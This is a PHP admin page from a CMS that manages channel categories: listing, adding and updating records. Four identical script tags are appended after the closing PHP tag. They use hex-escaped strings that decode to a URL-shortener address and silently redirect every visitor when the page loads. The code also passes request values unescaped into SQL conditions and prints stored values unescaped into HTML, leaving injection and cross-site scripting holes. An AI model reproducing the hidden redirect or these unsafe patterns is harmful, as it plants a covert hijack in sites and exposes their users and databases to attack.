<?php
define("ZW_IN", 'SETUP');
define("DB_PATH", 'FRONT');
require_once("helper.php");
$id = isset($_GET['id']) ? base64_decode($_GET['id']) : '';
$msg = isset($_GET['msg']) ? $_GET['msg'] : '';
class myCms extends Cms 
{
	function registerAjaxFunctions()
	{
		$this->xajax->registerFunction("get_Listing");
		$this->xajax->registerFunction("update_status");
		$this->xajax->registerFunction("deleteRow");
		$this->xajax->registerFunction("editMode");
		$this->xajax->registerFunction("sorting");
		$this->xajax->registerFunction("sortTitle");
	}
}
$objMisc = new myCms();
$objMisc->initializeAjax(false,true);
$objMisc->dbFunc->parameters ="&sortOrder=".$sortOrder."&sortBy=".$sortBy ;
$objMisc->rec_pp = 20;
$objMisc->dbFunc->ajax_pagin = true;
if($id){
	$where="CATEGORY_ID='$id'";
	$rowArray=$objMisc->getRow('channel_categories',$where);
}
if($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['submit'])){
	$cond="NAME='$_POST[name]'";
	$checkExistance=$objMisc->GiveValue($cond,'CATEGORY_ID','channel_categories');
	$target_dir = "uploads/channels/";
	$path = $_POST['path'];
	if(empty($checkExistance) && $_POST['user_id']==''){
		$rowArray=array('NAME'			=>addslashes($_POST['name']),
						'PRICE'	        =>addslashes($_POST['price']),
						'DESCRIPTION'	=>addslashes($_POST['description']),
						'DEFAULT_VALUE' =>$_POST['default_value'],
						'SEQUENCE'      =>$_POST['sequence'],
						'PATH'	        =>$path,
						'ADDED_BY'	    =>$_SESSION['USER_ID'],
						'ADDED_THROUGH'	=>'W',
						'ADDED_TIME'	=>date('Y-m-d H:i:s'));
		$lastId=$objMisc->insert("channel_categories",$rowArray);
		$_SESSION['msg']=1;
		header("LOCATION:channel-category-master.php");
		exit;
	}else if($_POST['category_id']!='' && $checkExistance==$_POST['category_id']){
		$where="CATEGORY_ID='$checkExistance'";
		$rowArray=array('NAME'			=>addslashes($_POST['name']),
						'PRICE'	        =>addslashes($_POST['price']),
						'DEFAULT_VALUE' =>$_POST['default_value'],
						'SEQUENCE'      =>$_POST['sequence'],
						'DESCRIPTION'	=>addslashes($_POST['description']),
						'PATH'	        =>$path);
		$insert=$objMisc->update("channel_categories",$rowArray,$where);
		$_SESSION['msg']=2;
		header("LOCATION:channel-category-master.php");
		exit;
	}else{
		$_SESSION['msg']=3;
		$rowArray = $_POST;
	}
}
$wherethis="1=1 AND STATUS!='T' ORDER BY SEQUENCE DESC";
$classRecord = $objMisc->getAllRecordsPaging("*","channel_categories",$wherethis);
$i  = 1;
$pagin_recs = "";
$pagin_recs = '<thead>
                <tr>';
$pagin_recs .= '<th width="7%">Sequence</th>
				<th width="8%">Logo</th>
                <th width="25%">Name</th>
                <th width="15%">Price</th>
                <th width="30%">Description</th>
                <th width="15%">Action</th>';
$pagin_recs .= '</tr></thead><tbody>';				
if(is_array($classRecord[1]) && !empty($classRecord[1])){
   foreach ($classRecord[1] as $k => $rowRec){		
    	$pagin_recs .= '<tr>';
    	$pagin_recs .='<td>'.$rowRec['sequence'].'</td>';
        $pagin_recs .='<td><img src="'.$rowRec['path'].'" style="width:30px;border-radius:50%"></td>';
        $pagin_recs .='<td>'.$rowRec['name'].' '.(($rowRec['default_value']=='D')?'<b style="color:red;">*</b>':'').'</td>';
        $pagin_recs .='<td>'.$rowRec['price'].'</td>';
        $pagin_recs .='<td>'.$rowRec['description'].'</td>';
        $pagin_recs .='<td> <input type="hidden" name="enumStatus'.$rowRec['category_id'].'" id="enumStatus'.$rowRec['category_id'].'"  value="'.$rowRec['status'].'">';
		if($rowRec['status']=='A'){
      	    $pagin_recs .= '<input type="image" src="images/active-btn.gif" name="imgStatus'.$rowRec['category_id'].'" id="imgStatus'.$rowRec['category_id'].'" alt="Deactivate" title="Deactivate" border="0" onclick="return myChangeStatus(this.form,'.$rowRec['category_id'].');">&nbsp;';            	
        }else{
		    $pagin_recs .= '<input type="image" src="images/deactive-btn.gif" name="imgStatus'.$rowRec['category_id'].'" id="imgStatus'.$rowRec['category_id'].'" alt="Activate" title="Activate" border="0" onclick="return myChangeStatus(this.form,'.$rowRec['category_id'].');">&nbsp;';        	
		}
    		$pagin_recs .= '<a href="channel-category-master.php?id='.base64_encode($rowRec['category_id']).'" data-toggle="tooltip" data-original-title="Edit"><img src="images/edit-btn.gif"  alt="Edit" title="Edit"  border="0"></a>
                            <a href="javascript:;" onclick="delRec('.$rowRec['user_id'].');" data-toggle="tooltip" data-original-title="Delete"><img src="images/trash.png"  alt="Delete" title="Delete"  border="0"></a></td>';
	    
        $pagin_recs .='</tr>';
            $i++;
    }
  	$pagin_recs  .= '<input type="hidden" value="'.$i.'" name="artCatCount" id="artCatCount">';
    if($classRecord[2]>$objMisc->rec_pp){
        $pagin_recs  .= '<tr><td colspan="5" style="text-align:center;">'.$classRecord[1].'</td></tr>';
    }
    $pagin_recs  .= '</tbody>';
} else {
    $pagin_recs .= '<tr><td colspan="5" style="text-align:center;">No Records Found</td></tr></tbody>';
}       
$msg = isset($_SESSION['msg']) ? $_SESSION['msg'] : $msg;
unset($_SESSION['msg']);
switch ($msg)
{
	case 1:
		$msg = "Channel Category added successfully.";
    break;
    case 2:
		$msg = "Channel Category updated successfully.";
    break;
    case 3:
        $errormsg = "Channel Category with same name already exists.";
		$msg = "";
	break;
	case 4:
        $errormsg = "Only jpg and png formats are allowed with max size 1mb.";
		$msg = "";
	break;
    
}
if($id){
	$pageheading = "Update Channel Category Details";
}else{
    $pageheading = "Add New Channel Category";
} 

$smartyVars['pageMainHeading']  = "Channel Categories";
$smartyVars['pageheading']  	= $pageheading;
$smartyVars['pagin_recs']  	    = $pagin_recs;
$smartyVars['group'] 			= $id;
$smartyVars['rowRec'] 			= $rowArray;
$smartyVars['errormsg'] 		= $errormsg;
$smartyVars['msg'] 				= $msg;
$objMisc->displayPage("header,channel-category-master,footer",$smartyVars);
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>